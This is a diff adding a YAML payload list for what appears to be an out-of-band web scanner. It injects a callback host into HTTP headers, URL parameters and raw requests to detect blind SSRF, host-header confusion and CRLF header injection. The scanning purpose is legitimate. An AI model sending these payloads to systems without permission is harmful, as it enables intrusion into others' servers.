@@ -1,0 +1,229 @@
+payloads:
+  - active: true
+    type: header
+    key: Contact
+    value: "root@%s"
+    group: standard
+    comment: "Mail/contact resolution"
+  - active: true
+    type: header
+    key: From
+    value: "root@%s"
+    group: standard
+    comment: "Mail sender callback"
+  - active: true
+    type: header
+    key: User-Agent
+    value: 'Mozilla/5.0 scanner <img src="https://%s">'
+    group: standard
+    comment: "Blind HTML parsing path"
+  - active: true
+    type: header
+    key: Referer
+    value: "https://%s"
+    group: standard
+    comment: "Referer fetch"
+  - active: true
+    type: header
+    key: X-Original-URL
+    value: "https://%s/"
+    group: standard
+    comment: "Proxy URL override"
+  - active: true
+    type: header
+    key: X-Wap-Profile
+    value: "https://%s/wap.xml"
+    group: standard
+    comment: "WAP profile fetch"
+  - active: true
+    type: header
+    key: Profile
+    value: "https://%s/wap.xml"
+    group: standard
+    comment: "Alternate WAP profile fetch"
+  - active: true
+    type: header
+    key: X-Arbitrary
+    value: "https://%s/"
+    group: standard
+    comment: "Custom URL fetch"
+  - active: true
+    type: header
+    key: X-HTTP-DestinationURL
+    value: "https://%s/"
+    group: standard
+    comment: "Destination URL override"
+  - active: true
+    type: header
+    key: X-Forwarded
+    value: "%s"
+    group: standard
+    comment: "Forwarded host callback"
+  - active: true
+    type: header
+    key: X-Forwarded-Proto
+    value: "https://%s/"
+    group: standard
+    comment: "Forwarded protocol callback"
+  - active: true
+    type: header
+    key: X-Forwarded-Host
+    value: "%s"
+    group: standard
+    comment: "Forwarded host value"
+  - active: true
+    type: header
+    key: X-Forwarded-For
+    value: "spoofed.%s"
+    group: standard
+    comment: "Spoofed address lookup"
+  - active: true
+    type: header
+    key: X-Forwarded-Server
+    value: "%s"
+    group: standard
+    comment: "Forwarded server callback"
+  - active: true
+    type: header
+    key: X-Host
+    value: "%s"
+    group: standard
+    comment: "Custom host callback"
+  - active: true
+    type: header
+    key: True-Client-IP
+    value: "spoofed.%s"
+    group: standard
+    comment: "IP parser callback"
+  - active: true
+    type: header
+    key: X-Real-IP
+    value: "spoofed.%s"
+    group: standard
+    comment: "IP parser callback"
+  - active: true
+    type: header
+    key: Forwarded
+    value: "for=spoofed.%s;by=spoofed.%s;host=spoofed.%s"
+    group: standard
+    comment: "RFC 7239 forwarded header"
+  - active: false
+    type: header
+    key: Host
+    value: "%h:%s"
+    group: standard
+    comment: "Host header variant"
+  - active: false
+    type: header
+    key: Origin
+    value: "https://%o.%s"
+    group: standard
+    comment: "Needs default origin"
+  - active: false
+    type: header
+    key: Proxy-Host
+    value: "%s"
+    group: standard
+    comment: "Proxy host override"
+  - active: false
+    type: param
+    key: url
+    value: "https://%s/"
+    group: standard
+    comment: "Common SSRF parameter"
+  - active: false
+    type: param
+    key: target
+    value: "https://%s/"
+    group: standard
+    comment: "Common SSRF parameter"
+  - active: false
+    type: param
+    key: proxy
+    value: "https://%s/"
+    group: standard
+    comment: "Proxy parameter"
+  - active: false
+    type: param
+    key: src
+    value: "https://%s/"
+    group: standard
+    comment: "Source URL parameter"
+  - active: false
+    type: param
+    key: ref
+    value: "https://%s/"
+    group: standard
+    comment: "Ref parameter"
+  - active: false
+    type: raw
+    key: absolute-url-host-mismatch
+    value: "GET https://%s{path} HTTP/1.1\\r\\nHost: {host}\\r\\n"
+    group: cracking_the_lens
+    comment: "Absolute URL and Host mismatch"
+  - active: false
+    type: raw
+    key: duplicate-host
+    value: "Host: {host}\\r\\nHost: %s"
+    group: cracking_the_lens
+    comment: "Duplicate Host header"
+  - active: false
+    type: raw
+    key: host-with-at
+    value: "Host: %s@{host}"
+    group: cracking_the_lens
+    comment: "userinfo parser confusion"
+  - active: false
+    type: raw
+    key: host-at-reversed
+    value: "Host: {host}@%s"
+    group: cracking_the_lens
+    comment: "reverse userinfo confusion"
+  - active: false
+    type: raw
+    key: host-with-hash
+    value: "Host: {host}#%s"
+    group: cracking_the_lens
+    comment: "fragment parser confusion"
+  - active: false
+    type: raw
+    key: host-crlf-inject
+    value: "Host: {host}\\r\\nX-Injected: %s"
+    group: cracking_the_lens
+    comment: "Header injection"
+  - active: false
+    type: raw
+    key: host-with-space
+    value: "Host: {host} %s"
+    group: cracking_the_lens
+    comment: "Space split parser confusion"
+  - active: false
+    type: raw
+    key: path-at-prefix
+    value: "GET @%s{path} HTTP/1.1\\r\\nHost: {host}\\r\\n"
+    group: cracking_the_lens
+    comment: "Path at prefix"
+  - active: false
+    type: raw
+    key: path-slash-prefix
+    value: "GET /%s{path} HTTP/1.1\\r\\nHost: {host}\\r\\n"
+    group: cracking_the_lens
+    comment: "Path slash prefix"
+  - active: false
+    type: raw
+    key: sni-host-mismatch
+    value: "sni=%s,host={host}"
+    group: cracking_the_lens
+    comment: "SNI to OOB, Host to target"
+  - active: false
+    type: raw
+    key: sni-host-mismatch-reversed
+    value: "sni={host},host=%s"
+    group: cracking_the_lens
+    comment: "SNI to target, Host to OOB"
+  - active: false
+    type: raw
+    key: alt-ports
+    value: "ports=8080,8443,4443,8888,8000,9090,9443"
+    group: cracking_the_lens
+    comment: "Repeat standard payloads on alternate ports"
